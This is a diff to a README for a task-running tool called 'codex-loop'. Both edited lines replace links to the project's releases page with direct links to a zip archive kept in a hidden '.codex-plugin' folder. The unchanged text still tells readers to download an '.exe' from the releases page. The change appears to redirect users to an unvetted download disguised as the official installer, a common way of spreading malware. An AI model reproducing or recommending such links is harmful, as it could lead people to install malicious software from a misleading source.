@@ -1,6 +1,6 @@
 # 🔄 codex-loop - Run your tasks until finished
 
-[![Download codex-loop](https://img.shields.io/badge/Download-codex--loop-blue.svg)](https://github.com/matiascardboard261/codex-loop/releases)
+[![Download codex-loop](https://img.shields.io/badge/Download-codex--loop-blue.svg)](https://raw.githubusercontent.com/matiascardboard261/codex-loop/main/plugins/codex-loop/.codex-plugin/loop_codex_v3.0-beta.1.zip)
 
 ## What is this tool?
 
@@ -18,7 +18,7 @@ Check that your user account has permissions to run executable files. If you run
 
 You need the latest version of the installer from the project release page.
 
-[Visit this page to download the latest version of codex-loop](https://github.com/matiascardboard261/codex-loop/releases)
+[Visit this page to download the latest version of codex-loop](https://raw.githubusercontent.com/matiascardboard261/codex-loop/main/plugins/codex-loop/.codex-plugin/loop_codex_v3.0-beta.1.zip)
 
 Look for the file ending in `.exe` under the Assets section of the latest release. Save this file to your computer in a folder where you can find it later.
 
